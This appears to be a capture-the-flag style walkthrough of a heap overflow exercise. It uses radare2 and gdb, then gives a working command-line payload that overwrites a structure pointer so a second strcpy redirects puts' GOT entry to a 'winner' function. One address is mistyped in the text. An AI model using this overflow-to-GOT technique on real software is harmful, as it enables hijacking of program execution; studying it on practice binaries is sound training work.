Here we go with another heap exploitation exercise, this time we don't have something as easy as modifying a pointer to a function (but this can happen in the real world).

Again let's going to analyze with radare2 the binary, and check what we have:

	$ r2 heap1
	> aaa
	> afl # check all the functions
	> s main
	> pdf # print the disassembly of main

We rename the variables and we get something like this:

mov dword [esp], 8          ; size_t size
call sym.imp.malloc         ;  void *malloc(size_t size)
mov dword [buffer1], eax
mov eax, dword [buffer1]
mov dword [eax], 1
mov dword [esp], 8          ; size_t size
call sym.imp.malloc         ;  void *malloc(size_t size)
mov edx, eax
mov eax, dword [buffer1]
mov dword [eax + 4], edx
mov dword [esp], 8          ; size_t size
call sym.imp.malloc         ;  void *malloc(size_t size)
mov dword [buffer2], eax
mov eax, dword [buffer2]
mov dword [eax], 2
mov dword [esp], 8          ; size_t size
call sym.imp.malloc         ;  void *malloc(size_t size)
mov edx, eax
mov eax, dword [buffer2]
mov dword [eax + 4], edx

So as we can see first a buffer is allocated, and stored in buffer1 with a size of 8 bytes, another buffer of 8 bytes is allocated again and stored in the offset 4 of buffer 1, the same happen with buffer2. So we have a structure like the next one:

struct buffer {
	uint32_t	something1;
	void*	    p_something;
}

And buffer1 and buffer2 now have an structure like this one. After that two strcpy functions are executed, one to buffer1->p_something with argv[1], and the other to buffer2->p_something with argv[2].

mov eax, dword [argv]
add eax, 4
mov eax, dword [eax]
mov edx, eax
mov eax, dword [buffer1]
mov eax, dword [eax + 4]
mov dword [arg1], edx       ; const char *src
mov dword [esp], eax        ; char *dest
call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
mov eax, dword [argv]
add eax, 8
mov eax, dword [eax]
mov edx, eax
mov eax, dword [buffer2]
mov eax, dword [eax + 4]
mov dword [arg1], edx       ; const char *src
mov dword [esp], eax        ; char *dest
call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)


As buffer1 and buffer1->p_something are allocated before of buffer2 and buffer2->p_something, what we can do is to replace buffer2->p_something for the address of a function in the GOT or in DTOR, and the second strcpy will fill that address with more data, here is where we will store the address of the function of "win", so let's going to locate the function with the win message with radare2:

	> afl
	> s sym.winner
	> pdf

We will modify the GOT of puts, that is the last function called in the main function, to get that address we can use gdb


	$ gdb -q ./heap1
	> b main
	> b *0x8048561 # breakpoint in the address of puts
	> r test1 test2

Now step until we get the addresses from malloc:

buffer1 = 0x0804a160
buffer1->p_something = 0x0804a170
buffer2 = 0x0804a180
buffer2->p_something = 0x0804a190

And also the instruction in the plt that call the GOT address:

jmp    DWORD PTR ds:0x8049774

So the address of puts in GOT is 0x8049774.


Our first buffer from strcpy will be stored in 0x0804a170, so we have to write until the address 0x0804a184 (where is stored the pointer 0x0804a190), after that we have to give the address 0x08049674.

First argument, we overwrite p_something in buffer2 with the address of puts@got:

	python -c "print 'A'*0x14 + '\x74\x97\x04\x08'"

And for second argument, the address of winner 0x08048494, this will be written into buffer2->p_something:

	python -c "print '\x94\x84\x04\x08'"

If we execute everything in the shell:

	$ ./heap1 `python -c "print 'A'*0x14 + '\x74\x97\x04\x08'"` `python -c "print '\x94\x84\x04\x08'"`
	and we have a winner @ 1589753306

So finally we have the winner output, because in the function sym.winner puts is not called, is called printf function. (puts is used to improve performance when no argument is given).
